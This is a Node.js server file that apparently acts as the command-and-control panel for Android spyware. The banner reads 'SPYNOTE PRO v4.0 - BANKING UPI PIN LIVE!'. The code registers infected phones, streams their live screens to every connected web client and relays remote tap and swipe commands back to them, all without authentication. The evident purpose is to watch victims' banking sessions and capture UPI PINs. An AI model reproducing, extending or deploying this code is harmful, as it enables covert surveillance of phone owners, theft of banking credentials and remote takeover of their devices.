const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 20000,
    pingInterval: 3000, // Faster heartbeat
    maxHttpBufferSize: 200e6 // HD banking frames
});

app.use(compression());
app.use(express.static('.'));
app.use(express.json({ limit: '200mb' }));
app.use(express.urlencoded({ limit: '200mb', extended: true }));

const devices = new Map();

// 🔥 GLOBAL ROOM FOR ALL WEB CLIENTS
const GLOBAL_ROOM = 'all-web-clients';

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log('🔌 Socket connected:', socket.id);
    
    // 🔥 ALL WEB CLIENTS JOIN GLOBAL ROOM (INSTANT FRAMES!)
    socket.join(GLOBAL_ROOM);
    console.log('🌐 Web client joined GLOBAL_ROOM:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true, 
                socketId: socket.id,
                lastSeen: Date.now()
            });
            socket.join(`device_${deviceId}`);
            console.log('✅ DEVICE LIVE:', deviceId.slice(0,12), deviceInfo.model || 'Android');
            io.to(GLOBAL_ROOM).emit('devices-update', Array.from(devices.entries()));
        }
    });

    socket.on('select-device', (data) => {
        socket.data.selectedDevice = data.deviceId;
        console.log('🎯 Selected:', data.deviceId);
    });

    // 🔥 FRAME BROADCAST TO ALL WEB CLIENTS (INSTANT!)
    socket.on('screen-frame', (frameData) => {
        const deviceId = frameData.deviceId;
        if (devices.has(deviceId)) {
            devices.set(deviceId, { ...devices.get(deviceId), lastSeen: Date.now() });
            
            console.log(`📱 Frame → ${deviceId.slice(0,8)} (${frameData.width}x${frameData.height})`);
            
            // 🔥 TO ALL WEB CLIENTS (GLOBAL!)
            io.to(GLOBAL_ROOM).emit('screen-frame', frameData);
            // Also device room
            socket.to(`device_${deviceId}`).emit('screen-frame', frameData);
        }
    });

    // 🔥 CONTROL ROUTING
    socket.on('control', (controlData) => {
        const { deviceId, action, x, y, startX, startY, endX, endY } = controlData;
        if (devices.has(deviceId)) {
            console.log(`🎮 ${action.toUpperCase()} → ${deviceId.slice(0,8)} (${x?.toFixed(0)},${y?.toFixed(0)})`);
            socket.to(`device_${deviceId}`).emit('control', controlData);
        }
    });

    socket.on('disconnect', () => {
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                io.to(GLOBAL_ROOM).emit('devices-update', Array.from(devices.entries()));
                console.log('📱 Device OFFLINE:', deviceId.slice(0,12));
                break;
            }
        }
    });
});

// Heartbeat
setInterval(() => {
    for (const [deviceId, info] of devices.entries()) {
        if (info.connected && (Date.now() - info.lastSeen > 45000)) {
            devices.set(deviceId, { ...info, connected: false });
            io.to(GLOBAL_ROOM).emit('devices-update', Array.from(devices.entries()));
        }
    }
}, 10000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🚀 SPYNOTE PRO v4.0 - BANKING UPI PIN LIVE!`);
    console.log(`🌐 http://localhost:${PORT}`);
    console.log(`📱 GLOBAL BROADCAST → INSTANT FRAMES + LAYOUTS!\n`);
});
